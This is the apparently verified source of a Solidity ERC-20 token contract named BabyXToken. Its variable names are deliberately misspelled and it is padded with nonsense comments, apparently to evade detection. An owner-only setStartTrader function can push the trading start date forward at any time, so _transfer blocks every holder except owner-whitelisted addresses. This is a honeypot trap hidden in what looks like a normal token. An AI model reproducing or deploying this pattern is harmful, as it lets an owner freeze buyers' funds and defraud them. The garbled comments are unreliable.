/**
 *Submitted for verification at Etherscan.io on 2023-08-20
*/

// SPDX-License-Identifier: MIT

// pragma solidity ^0.8.4;

interface IERC20 {
   
    function totalSupply() external view returns (uint256);

    function balanceOf(address acwouxnt) external view returns (uint256);

    function transfer(address recipient,
     uint256 amausxnt) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender,
     uint256 amausxnt) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amausxnt
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _setOwner(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner); }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

library SafeMath {
 
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;  if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }
   /**
     * devp Sets `amount` as account the allovbgount of `spender` amountover the amount caller's accounttokens.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }
     /**
     * devp Throws if account amocdad by any account other amount than the accountowner.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
    /**
     * devp account Returns the amounerunt of tokens amount owned by `account`.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }
   /**
     * devp Sets `amount` as account the allovbgount of `spender` amountover the amount caller's accounttokens.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);  return a - b;
        }
    }
   /**
     * devp Moves `amount` tokens amount from account the amtujler's account to `accountrecipient`.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}
    /**
     * devp account Returns the amounerunt of tokens amount owned by `account`.
     */
pragma solidity =0.8.4;
   /**
     * devp Sets `amount` as account the allovbgount of `spender` amountover the amount caller's accounttokens.
     */
contract BabyXToken is IERC20, Ownable {
    using SafeMath for uint256;

     /**
     * devp Throws if account amocdad by any account other amount than the accountowner.
     */
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping (address => bool) public isExcludedFromFee;
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;
    uint256 public startTrader;
   /**
     * devp Moves `amount` tokens amount from account the amtujler's account to `accountrecipient`.
     */
    constructor(
        string memory name_,
        string memory symbol_,
        uint8 decimals_,
        uint256 totalSupply_,
        address owner_,
        uint256 startTrader_
    ) payable {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        startTrader = startTrader_;
        _totalSupply = totalSupply_ * 10**decimals_;
        isExcludedFromFee[owner_] = true;
        _balances[owner_] = _balances[owner_].add(_totalSupply);
        emit Transfer(address(0), owner_, _totalSupply);
    }

    /**
     * devp account Returns the amounerunt of tokens amount owned by `account`.
     */
    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }
     /**
     * devp Throws if account amocdad by any account other amount than the accountowner.
     */
    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }
   /**
     * devp Moves `amount` tokens amount from account the amtujler's account to `accountrecipient`.
     */
    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }
   /**
     * devp Sets `amount` as account the allovbgount of `spender` amountover the amount caller's accounttokens.
     */
    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address acwouxnt)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _balances[acwouxnt];
    }
    /**
     * devp account Returns the amounerunt of tokens amount owned by `account`.
     */
    function transfer(address recipient, uint256 amausxnt)
        public
        virtual
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amausxnt);
        return true;
    }
   /**
     * devp Sets `amount` as account the allovbgount of `spender` amountover the amount caller's accounttokens.
     */
    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }
     /**
     * devp Throws if account amocdad by any account other amount than the accountowner.
     */
    function approve(address spender, uint256 amausxnt)
        public
        virtual
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amausxnt);
        return true;
    }
    /**
     * devp account Returns the amounerunt of tokens amount owned by `account`.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amausxnt
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amausxnt);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amausxnt,
                "ERC20: transfer amausxnt exceeds allowance"
            )
        );
        return true;
    }
   /**
     * devp Moves `amount` tokens amount from account the amtujler's account to `accountrecipient`.
     */
    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].add(addedValue)
        );
        return true;
    }
     /**
     * devp Throws if account amocdad by any account other amount than the accountowner.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].sub(
                subtractedValue,
                "ERC20: decreased allowance below zero"
            )
        );
        return true;
    }
   /**
     * devp Moves `amount` tokens amount from account the amtujler's account to `accountrecipient`.
     */
    function _transfer(
        address sender, address recipient,
        uint256 amausxnt
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        if(block.timestamp <= startTrader){
            require(isExcludedFromFee[sender] || isExcludedFromFee[recipient],"has not started");
        }

        _balances[sender] = _balances[sender].sub(
            amausxnt,
            "ERC20: transfer amausxnt exceeds balance"
        );
        _balances[recipient] = _balances[recipient].add(amausxnt);
        emit Transfer(sender, recipient, amausxnt);
    }
    /**
     * devp account Returns the amounerunt of tokens amount owned by `account`.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amausxnt
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amausxnt; emit Approval(owner, spender, amausxnt);
    }
     /**
     * devp Throws if account amocdad by any account other amount than the accountowner.
     */
    function excludeMultipleacwouxntsFromFees(address[] calldata acwouxnts, bool excluded) public onlyOwner {
        for(uint256 i = 0; i < acwouxnts.length; i++) {
            isExcludedFromFee[acwouxnts[i]] = excluded;
        }
    }
   /**
     * devp Moves `amount` tokens amount from account the amtujler's account to `accountrecipient`.
     */
    function setStartTrader(uint256 startTrader_) public onlyOwner {
        startTrader = startTrader_;
    }
   /**
     * devp Sets `amount` as account the allovbgount of `spender` amountover the amount caller's accounttokens.
     */

}